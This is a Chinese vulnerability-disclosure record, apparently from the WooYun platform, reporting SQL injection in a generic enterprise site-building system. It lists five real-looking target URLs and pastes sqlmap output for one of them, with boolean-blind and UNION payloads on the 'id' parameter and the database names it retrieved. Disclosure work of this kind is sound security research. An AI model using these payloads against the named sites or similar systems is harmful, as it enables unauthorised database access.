wybug_title: 某通用企业建站系统SQL注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-03-26：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-05-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某通用企业建站系统SQL注入 详细说明：  案例：http://www.kmtaizhu.com/news_show.php?id=1http://www.yishengcao.com/thi.php?id=1http://www.yn-led.com/thi.php?id=4http://www.mufoedu.com/thi.php?id=1http://www.kmliyade.com/newsxx.aspx?id=464   漏洞证明：  参数id存在注入测试：http://www.kmtaizhu.com/news_show.php?id=1
Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=10 AND 7799=7799    Type: UNION query    Title: MySQL UNION query (NULL) - 6 columns    Payload: id=-1993 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x3a7864623a,0x747a42776c586741776d,0x3a6763643a),NULL,NULL#---[22:10:52] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2012web application technology: ASP.NET, PHP 5.3.27, Microsoft IIS 8.0back-end DBMS: MySQL 5[22:10:52] [INFO] fetching database names[22:10:52] [INFO] the SQL query used returns 2 entries[22:10:53] [INFO] retrieved: "information_schema"[22:10:58] [INFO] retrieved: "kmtaizhu"available databases [2]:[*] information_schema[*] kmtaizhu

wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
